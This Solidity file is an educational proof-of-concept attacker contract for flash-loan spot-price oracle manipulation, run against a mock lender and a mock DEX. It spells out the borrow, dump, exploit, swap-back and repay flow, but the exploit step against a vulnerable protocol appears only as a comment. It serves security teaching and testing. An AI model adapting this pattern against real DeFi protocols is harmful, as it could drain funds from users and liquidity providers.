// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

/// @title IFlashLoanReceiver (simplified interface)
/// @notice In a real Aave V3 flash loan, the receiver implements:
///
///   function executeOperation(
///       address[] calldata assets,
///       uint256[] calldata amounts,
///       uint256[] calldata premiums,
///       address initiator,
///       bytes calldata params
///   ) external returns (bool);
///
/// This contract uses a SIMPLIFIED mock pattern for educational purposes.
/// No external dependencies. No Aave fork required.

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/// @title IMockFlashLender -- minimal flash loan interface for PoC
interface IMockFlashLender {
    function flashLoan(address borrower, address token, uint256 amount) external;
}

/// @title IMockDEX -- minimal DEX interface for oracle manipulation
interface IMockDEX {
    function swap(address tokenIn, uint256 amountIn) external returns (uint256 amountOut);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function token0() external view returns (address);
    function token1() external view returns (address);
}

/// @title FlashLoanAttacker -- Flash Loan Oracle Manipulation PoC
/// @notice Demonstrates how an attacker uses a flash loan to manipulate
///         a spot price oracle and exploit a vulnerable protocol.
///
///         Attack flow:
///         1. Borrow tokens via flash loan (no collateral)
///         2. Dump tokens on DEX (manipulate spot price)
///         3. Exploit vulnerable protocol at manipulated price
///         4. Swap back on DEX (restore position)
///         5. Repay flash loan + fee
///         6. Keep profit
///
///         This is a SIMPLIFIED PoC. Real attacks use more complex
///         multi-hop strategies across multiple protocols.
///
/// @dev Uses mock flash loan provider and mock DEX.
///      NOT a real exploit -- educational only.
contract FlashLoanAttacker {
    // ---------------------------------------------------------------
    //  State
    // ---------------------------------------------------------------

    IMockFlashLender public immutable lender;
    IMockDEX public immutable dex;
    address public immutable owner;

    /// @notice Tracks profit from the attack (for test assertions)
    uint256 public profit;

    /// @notice Tracks pre-attack and post-attack prices (for test assertions)
    uint256 public priceBeforeAttack;
    uint256 public priceDuringAttack;
    uint256 public priceAfterAttack;

    // ---------------------------------------------------------------
    //  Events
    // ---------------------------------------------------------------

    event AttackStarted(uint256 borrowAmount);
    event PriceManipulated(uint256 priceBefore, uint256 priceDuring);
    event AttackCompleted(uint256 profit);

    // ---------------------------------------------------------------
    //  Errors
    // ---------------------------------------------------------------

    error OnlyLender();
    error OnlyOwner();

    // ---------------------------------------------------------------
    //  Constructor
    // ---------------------------------------------------------------

    constructor(address _lender, address _dex) {
        lender = IMockFlashLender(_lender);
        dex = IMockDEX(_dex);
        owner = msg.sender;
    }

    // ---------------------------------------------------------------
    //  Attack Entry Point
    // ---------------------------------------------------------------

    /// @notice Initiate the flash loan attack
    /// @param token The token to borrow
    /// @param amount The amount to borrow (larger = more price impact)
    function attack(address token, uint256 amount) external {
        if (msg.sender != owner) revert OnlyOwner();

        // Record pre-attack price
        (uint112 r0, uint112 r1, ) = dex.getReserves();
        priceBeforeAttack = (uint256(r1) * 1e18) / uint256(r0);

        emit AttackStarted(amount);

        // Step 1: Request flash loan (callback will execute the attack)
        lender.flashLoan(address(this), token, amount);
    }

    // ---------------------------------------------------------------
    //  Flash Loan Callback
    // ---------------------------------------------------------------

    /// @notice Called by the flash loan lender during flashLoan().
    ///         This is where the attack logic executes.
    /// @param token The borrowed token
    /// @param amount The borrowed amount
    /// @param fee The flash loan fee to repay
    function onFlashLoan(address token, uint256 amount, uint256 fee) external {
        if (msg.sender != address(lender)) revert OnlyLender();

        // Step 2: Dump borrowed tokens on DEX (manipulate price)
        IERC20(token).approve(address(dex), amount);
        uint256 receivedFromDump = dex.swap(token, amount);

        // Record manipulated price
        (uint112 r0, uint112 r1, ) = dex.getReserves();
        priceDuringAttack = (uint256(r1) * 1e18) / uint256(r0);

        emit PriceManipulated(priceBeforeAttack, priceDuringAttack);

        // Step 3: In a real attack, exploit vulnerable protocol here
        //         (liquidation at manipulated price, borrow with inflated collateral)
        //         Simplified: we just record the price difference

        // Step 4: Swap back to get original tokens
        address otherToken = dex.token0() == token ? dex.token1() : dex.token0();
        IERC20(otherToken).approve(address(dex), receivedFromDump);
        uint256 recoveredTokens = dex.swap(otherToken, receivedFromDump);

        // Record post-attack price
        (r0, r1, ) = dex.getReserves();
        priceAfterAttack = (uint256(r1) * 1e18) / uint256(r0);

        // Step 5: Repay flash loan + fee
        uint256 repayAmount = amount + fee;
        IERC20(token).approve(address(lender), repayAmount);
        // Note: the lender's flashLoan() will transferFrom the repayment

        // Step 6: Track profit (tokens recovered - repaid)
        // In a real attack, profit comes from exploiting the vulnerable protocol
        // Here we show the slippage loss from round-trip (negative in pure swap)
        if (recoveredTokens > repayAmount) {
            profit = recoveredTokens - repayAmount;
        } else {
            profit = 0; // Round-trip without exploit = loss (slippage + fee)
        }

        emit AttackCompleted(profit);
    }
}
